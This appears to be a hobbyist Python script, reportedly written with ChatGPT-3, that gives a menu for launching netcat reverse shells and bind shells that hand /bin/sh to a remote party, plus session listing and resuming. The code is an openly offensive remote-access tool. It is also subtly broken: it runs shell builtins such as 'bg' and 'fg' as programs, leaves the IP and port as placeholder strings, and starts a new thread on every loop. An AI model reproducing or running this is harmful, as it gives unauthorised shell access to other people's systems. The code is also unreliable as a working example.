#!/usr/bin/python
import subprocess, sys, select, threading

###########
#Netcat shell menu in coop with chat gpt3
###########

# A list to store the running processes
processes = []

def reverse_shell():
    # Start a reverse shell by connecting to the target IP and port
    p = subprocess.Popen(["nc", "-e", "/bin/sh", "target_ip", "target_port"])
    processes.append(p)

def bind_shell():
    # Start a bind shell by listening on a specific port
    p = subprocess.Popen(["nc", "-l", "-p", "listen_port", "-e", "/bin/sh"])
    processes.append(p)

def background_session():
    # Background the current session
    p = subprocess.Popen(["bg"])
    processes.append(p)

def list_sessions():
    # List all running sessions
    for i, p in enumerate(processes):
        print(f"{i+1}. Session {i+1} (PID: {p.pid})")

def resume_session():
    session_number = int(input("Enter the session number you want to resume: "))
    p = processes[session_number-1]
    subprocess.Popen(["fg", str(p.pid)])

def listen_background_session():
    while True:
        r, w, e = select.select([sys.stdin], [], [], 0.1)
        if r:
            c = sys.stdin.read(1)
            if c == 'b':
                background_session()

while True:
    print("1. Reverse shell")
    print("2. Bind shell")
    #print("3. Background session")
    print("3. List sessions")
    print("4. Resume session")
    choice = input("Enter your choice: ")

    if choice == "1":
        reverse_shell()
    elif choice == "2":
        bind_shell()
    #elif choice == "3":
    #    background_session()
    elif choice == "3":
        list_sessions()
    elif choice == "4":
        resume_session()
    else:
        print("Invalid choice")
    t = threading.Thread(target=listen_background_session)
    t.start()